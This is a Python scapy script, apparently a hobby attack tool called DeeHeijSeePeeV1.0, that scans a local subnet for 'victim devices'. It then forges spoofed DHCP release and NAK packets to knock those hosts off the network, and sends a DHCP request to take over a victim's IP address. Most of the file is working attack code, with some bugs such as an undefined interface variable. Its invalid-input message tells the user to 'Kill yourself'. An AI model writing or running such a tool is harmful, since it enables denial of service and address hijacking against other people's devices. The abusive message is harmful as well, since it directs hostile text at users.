from scapy.all import *
from datetime import datetime
import sys
import socket

def get_local_ip():
    try:
        # Connect to an external IP (Google DNS) without sending data
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception as e:
        return f"Error: {e}"
# Dictionary to store DHCP bindings
dhcp_bindings = {}
DHCP_SERVER_IP_ADDRESS = "192.168.0.1"
def print_banner():
    banner = r"""                                                                                                    
                                                                                    
                                                                                    
                                             @                                      
                                          @@%@                                      
                                         @@%@                                       
                                         @@%@                                       
                                       @@%%%%@                                      
                                      @@%%%%@                                       
                                     @%%%%#%@                                       
                                     @%#*+++*                                       
                                     *++++++*                                       
                                    #+++++++*                                       
                                   %+++++++*%                                       
                                  @*++++++++@                                       
                                  #*++++++++@                                       
                               @*+++++++++++**@                                     
                             #*++++++++++++++++#                                    
                           #*+++++*@##++++++++++*#                                  
                         %**+***#%@%@#++++++++++++##***#*+++*#@%@@                  
                         *+*##***%#%%+++++++++***+++++++++++*%%%%@@                 
                         #+##**#++++++++++++*@%#%#++++++++++*%%%%%@@                
                         @**++%@+++++++++++*@#%%@*++++++++*%   @%%%%@@              
                          @+++%@============@*@@%*++++*%%         @%%@@             
                           *===####@#========+*+==++#               @%@             
                            #=======@%+====+***====+#        @@                     
                             #========+@++#%***+===#     @%####%                    
                             %*++=======##****====@   %%#######%@                   
                            @*+++++++===========#%  @%#######%#%@                   
                           @*++++++++++*#####%@   @%###%%######%                    
                           *+++++++++++++@       %###%#%####*#                      
                          %+++===========+*@    @%########%@                        
                         %++================%     %##%@                             
                         +======*#===*%======%  %#####%                             
                        *=======**===+%=======@%#**#%@                              
                        *=====================+ @#*#%                               
                       %======================+%###@                                
                  #++++========================+*%                                  
                   @%%#*+===========================+*                              
                 @@@@@@%%*==+#%%#====*%#+=====#%%%@@@                               
                                   %# @@   %### @@                                  
                                                                                    
                                                                                    
                                                                                                                                                                  
                       
    """
    print(banner)
    print("DeeHeijSeePeeV1.0\n")
    print("Press S to map MAC addresses on victim devices, H for help, or Q to quit.\n")

def get_mac_from_ip(ip, bindings):
    for mac, bound_ip in bindings.items():
        if bound_ip == ip:
            return mac
    return None  # not found

def forge_false_release(ip_address, number_of_times=1):   
    """
    Forge a DHCP Release packet to drop an IP address.
    """
    mac_address = get_mac_from_ip(ip_address, dhcp_bindings) 
    print(f"MAC address for {ip_address} is {mac_address}")
    for _ in range(int(number_of_times)):
        print("starting DHCP release")
        #p = chaddr=bytes.fromhex("60:b9:c0:3b:96:21".replace(":",""))
        print("MAC ADDRESS", mac_address)
        
        # Convert MAC to raw 16-byte chaddr field (6 bytes for MAC, padded to 16)
        mac_bytes = bytes.fromhex(mac_address.replace(":", "")) + b'\x00' * 10

        # Craft DHCPRELEASE packet
        packet = (
            Ether(src=mac_address, dst="60:b9:c0:3b:96:21") /
            IP(src=ip_address, dst=DHCP_SERVER_IP_ADDRESS) /
            UDP(sport=68, dport=67) /
            BOOTP(op=1, chaddr=mac_bytes, ciaddr=ip_address, xid=random.randint(0, 0xFFFFFFFF)) /
            DHCP(options=[
                ("message-type", "release"),
                ("server_id", DHCP_SERVER_IP_ADDRESS),
                ("client_id", b'\x01'+  bytes.fromhex(mac_address.replace(":", ""))),
                ("end")
            ]) / 
            Raw(load=b'\x00' * 43)
        )

        # Send the packet (update iface to match your interface)
        sendp(packet, iface="Ethernet 2", verbose=1)
        
        # send(Ether(src=mac_address, dst="60:b9:c0:3b:96:21") /
        #     IP(src=ip_address,dst=DHCP_SERVER_IP_ADDRESS) / 
        #     UDP(sport=68,dport=67) /
        #     BOOTP(chaddr=bytes.fromhex(mac_address.replace(":","")), ciaddr=ip_address, xid=random.randint(0, 0xFFFFFFFF)) /
        #     DHCP(options=[("message-type","release"), ("server_id",DHCP_SERVER_IP_ADDRESS), 'end']))
        
        # # packet = Ether(src=mac_address, dst=p) / \
        # #         IP(src=ip_address, dst=DHCP_SERVER_IP_ADDRESS) / \
        # #         UDP(sport=68, dport=67) / \
        # #             BOOTP(op=1, chaddr=bytes.fromhex(mac_address.replace(":","")), ciaddr=ip_address, xid=RandInt()) / \
        # #             DHCP(options=[("message-type", "release"), ("server_id", DHCP_SERVER_IP_ADDRESS), "end"])
        # # send(packet, verbose=False)
        # print(f"Sent DHCP Release for {ip_address} from {mac_address}")
        print("Die")


def drop_and_mimic(ip_address, number_of_times=1):
    """
    Drop an IP address and craft a DHCPREQUEST to steal the IP address.
    """
    xid = random.randint(1, 0xFFFFFFFF)
    mac_address = get_mac_from_ip(ip_address, dhcp_bindings)
    if not mac_address:
        print(f"MAC address for {ip_address} not found in bindings.")
        return
    mac = get_if_hwaddr(iface)
    forge_false_release(ip_address, number_of_times)
    print(f"Dropped IP {ip_address} for MAC {mac_address} and mimicked DHCP release.") 
    print(f"Attempting to steal IP {ip_address}...")    
    
    dhcp_request = (
        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=mac2str(mac), xid=xid, flags=0x8000) /
        DHCP(options=[
            ("message-type", "request"),
            ("server_id", DHCP_SERVER_IP_ADDRESS),
            ("requested_addr", ip_address),
            ("param_req_list", [1, 3, 6, 15, 28, 51, 58, 59]),
            "end"
        ])
    )

    print(f"Sending DHCPREQUEST for {ip_address} to server...")
    sendp(dhcp_request, iface=iface, verbose=0)

    # Optionally, wait for DHCPACK to confirm
    print("Waiting for DHCPACK...")
    ack = sniff(
        iface=iface,
        filter="udp and (port 67 or 68)",
        stop_filter=lambda p: DHCP in p and p[DHCP].options[0][1] == 5 and p[BOOTP].xid == xid,
        timeout=10
    )

    if ack:
        ack_packet = ack[0]
        print(f"Received DHCPACK: lease confirmed for {ack_packet[BOOTP].yiaddr}")
    else:
        print("No DHCPACK received.")
    
    
def drop_all_address_in_mimic_table():  
    """
    Attempt to drop all active DHCP requests in the mimic table.
    """
    if not dhcp_bindings:
        print("\nNo DHCP bindings to drop.\n")
        return
    for mac, ip in dhcp_bindings.items():
        forge_false_release(mac, ip)
        print(f"Dropped IP {ip} for MAC {mac}")


def print_help():   
    print("TCP DHCP Releaser Help:")
    print("S - Map TCP connections of other devices")
    print("RA - Release all DHCP bindings")
    print("R - Release a specific IP address (syntax: R -<ip> <param> [-m])")
    print("H - Show this help message")
    print("P - Print current DHCP bindings")
    print("Q - Quit the program")
    print("\nNote: This tool is designed to work with devices in the same VLAN and requires appropriate permissions to send TCP ACK requests.")


def print_bindings():
    """
    Print the current DHCP bindings in a neat table.
    """
    if not dhcp_bindings:
        print("No DHCP bindings found.\n")
        return

    print("\n{:<4} {:<20} {:<15}".format("No.", "MAC Address", "IP Address"))
    print("-" * 43)
    for idx, (mac, ip) in enumerate(dhcp_bindings.items(), 1):
        print("{:<4} {:<20} {:<15}".format(idx, mac, ip))
    print("-" * 43 + "\n")

def tcp_arp_scan_dynamic():
    """
    Perform a TCP ARP scan on the /24 subnet of the current local IP.
    """
    local_ip = get_local_ip()
    print(f"Scanning for devices on local network: {local_ip} with subnet /24")
    base_ip_parts = local_ip.split(".")[:3]  # e.g., ['192', '168', '0']

    for i in range(1, 7):
        #Step 1: ARP to get MAC address
        target_ip = f"{base_ip_parts[0]}.{base_ip_parts[1]}.{base_ip_parts[2]}.{i}"
        interface = "Ethernet 2"

        arp_request = ARP(pdst=target_ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp_request

        ans, _ = srp(packet, timeout=2, iface=interface, verbose=False)

        if ans:
            target_mac = ans[0][1].hwsrc
            print(f"[+] MAC Address of {target_ip} is {target_mac}")
            dhcp_bindings[target_mac] = target_ip  # Store IP and MAC
        else:
            print(f"[-] No ARP reply received. Host may be offline.")
            continue

        # Step 2: TCP SYN to check for online presence
        ip = IP(dst=target_ip)
        tcp = TCP(dport=80, flags="S")  # SYN to port 80

        response = sr1(ip/tcp, timeout=2, iface=interface, verbose=False)

        if response and response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:
            print(f"[+] Host {target_ip} is online. Port 80 is open.")
            # Send RST to close the half-open connection
            rst = TCP(dport=80, sport=response.sport, flags="R", seq=response.ack, ack=response.seq + 1)
            send_rst = ip / rst
            sr1(send_rst, timeout=1, verbose=False)
        else:
            print(f"[-] No SYN-ACK. Host may be down or port is closed.")

def tcp_syn_scan_dynamic():
    """
    Perform a TCP SYN scan on the /24 subnet of the current local IP.
    """
    local_ip = get_local_ip()
    print(f"Scanning for devices on local network: {local_ip} with subnet /24")
    base_ip_parts = local_ip.split(".")[:3]  # e.g., ['192', '168', '0']

    target_port = 456  # Common web port

    for i in range(1, 6):
        ip = f"{base_ip_parts[0]}.{base_ip_parts[1]}.{base_ip_parts[2]}.{i}"
        print(f"Scanning IP: {ip}")

        # Craft SYN packetd
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC address
        ip_packet = IP(dst=ip)
        tcp_packet = TCP(flags="S")

        # Send and receive response
        response = sr1(ip_packet / tcp_packet, timeout=2, verbose=1)

        if response is None:
            print(f"No response from {ip}")
            continue
        print(f"summary below")
        print(response)
        if response.haslayer(Ether):
            tcp_flags = response.getlayer(TCP).flags
            if tcp_flags == 0x12:  # SYN-ACK
                print(f"[+] Host {ip} has port {target_port} open (SYN/ACK received)")
                mac =response.src  # Store IP and MAC
                dhcp_bindings[ip] = mac
            elif tcp_flags == 0x14:  # RST-ACK
                print(f"[-] Host {ip} is up, but port {target_port} is closed (RST received)")
                #dhcp_bindings[ip] = "RST"
        else:
            print(response)
            print(f"[?] Unexpected response from {ip}")


def forge_false_NACK(ip_address, number_of_times=1):
    """
    Forge a DHCP NACK packet to force client to invalidate its IP address.
    """
    mac_address = get_mac_from_ip(ip_address, dhcp_bindings)
    if not mac_address:
        print(f"MAC address for {ip_address} not found in bindings.")
        return

    for i in range(number_of_times):
            # Create BOOTP and DHCP layers separately
            bootp = BOOTP(
                op=2,
                yiaddr="0.0.0.0",
                chaddr=mac2str(mac_address),
                ciaddr=ip_address,
                xid=RandInt()
            )

            dhcp = DHCP(options=[
                ("message-type", "nak"),
                ("server_id", DHCP_SERVER_IP_ADDRESS),
                "end"
            ])

            # Construct full packet
            packet = Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff") / \
                    IP(src=DHCP_SERVER_IP_ADDRESS, dst="255.255.255.255") / \
                    UDP(sport=67, dport=68) / \
                    bootp / dhcp

            # Send packet
            sendp(packet, verbose=1)
            print(f"Sent DHCP NACK for {ip_address} from {mac_address} to invalidate its IP address.")


def main():
    print_banner()
    print("Press H for help or Q to quit.\n")
    while True:
        choice = input(">> ").strip().upper()
        if choice == "S":
            print("Mapping TCP connections of other devices...")
            tcp_arp_scan_dynamic()  
            print("ARP scan completed. Current DHCP bindings:")
            print_bindings()
            # Here you would implement the logic to map TCP connections by sending TCP ACK requests to other user devices found in the VLAN. From the TCP ACK they give back, find their MAC address and associated IP and map it in the dhcp_bindings dictionary.
            
        elif choice == "H":
            print_help()
        elif choice == "Q":
            print("Exiting DHCP Monitor. Goodbye!")
            sys.exit(0)
        elif choice == "P":
            print_bindings()
        elif choice.startswith("R "):
            parts = choice.split()
            if len(parts) >= 3 and parts[1].startswith("-"):
                ip = parts[1][1:]  # Remove the dash
                param = parts[2]
                use_mimic = "-m" in parts

                if use_mimic:
                    try:
                        tries = int(param)
                        drop_and_mimic(ip, tries)
                    except ValueError:
                        if use_mimic:
                            print("Mimicing requires a number of tries.")
                        else:
                            forge_false_release(ip,1)
                else:
                    forge_false_release(ip, param)
            else:
                print("Invalid syntax. Use: R -<ip> <tryCount> [-m]")
        else:
            print("Invalid choice. Kill yourself \n")

if __name__ == "__main__":
    main()